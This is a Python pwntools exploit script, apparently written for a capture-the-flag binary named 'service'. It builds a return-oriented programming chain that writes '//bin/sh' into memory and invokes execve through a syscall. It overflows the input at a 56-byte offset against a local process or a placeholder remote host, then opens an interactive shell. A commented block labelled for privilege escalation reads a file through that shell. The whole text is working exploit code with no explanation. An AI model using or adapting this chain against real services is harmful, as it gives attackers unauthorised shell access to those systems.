#!/usr/bin/env python3
from pwn import *
from struct import pack

exe = ELF("./service")

context.binary = exe
context.terminal = ['konsole', '-e']

def gen_rop():
    p = lambda x : pack('Q', x)

    IMAGE_BASE_0 = 0x0000000000400000 # aae3c9732e164e7d4d0643ec3d3d8bd1f2a571dcb933e57afd11939c43984473
    rebase_0 = lambda x : p(x + IMAGE_BASE_0)

    rop = b''

    rop += rebase_0(0x000000000000962f) # 0x000000000040962f: pop r13; ret; 
    rop += b'//bin/sh'
    rop += rebase_0(0x0000000000001b2d) # 0x0000000000401b2d: pop rbx; ret; 
    rop += rebase_0(0x00000000000cc0e0)
    rop += rebase_0(0x00000000000715c2) # 0x00000000004715c2: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += rebase_0(0x000000000000962f) # 0x000000000040962f: pop r13; ret; 
    rop += p(0x0000000000000000)
    rop += rebase_0(0x0000000000001b2d) # 0x0000000000401b2d: pop rbx; ret; 
    rop += rebase_0(0x00000000000cc0e8)
    rop += rebase_0(0x00000000000715c2) # 0x00000000004715c2: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += rebase_0(0x0000000000001ece) # 0x0000000000401ece: pop rdi; ret; 
    rop += rebase_0(0x00000000000cc0e0)
    rop += rebase_0(0x000000000000880e) # 0x000000000040880e: pop rsi; ret; 
    rop += rebase_0(0x00000000000cc0e8)
    rop += rebase_0(0x000000000008ef5b) # 0x000000000048ef5b: pop rdx; pop rbx; ret; 
    rop += rebase_0(0x00000000000cc0e8)
    rop += p(0xdeadbeefdeadbeef)
    rop += rebase_0(0x000000000000302c) # 0x000000000040302c: pop rax; ret; 
    rop += p(0x000000000000003b)
    rop += rebase_0(0x000000000001ca64) # 0x000000000041ca64: syscall; ret; 
    return rop

def conn():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote("XXX.XXX.XXX.XXX", 00000)

    return r


def main():
    r = conn()

    wanted = p64(0x401885)
    offset = 56

    r.recvuntil('?')
    r.recvline()
    r.sendline(flat({offset: gen_rop()}))
    r.recvline()

    # For PrivEsc
    '''with open('check', 'wb') as f:
        r.sendline('cat /bin/check')
        r.sendline('exit')
        f.write(r.recvall())'''

    r.interactive()


if __name__ == "__main__":
    main()
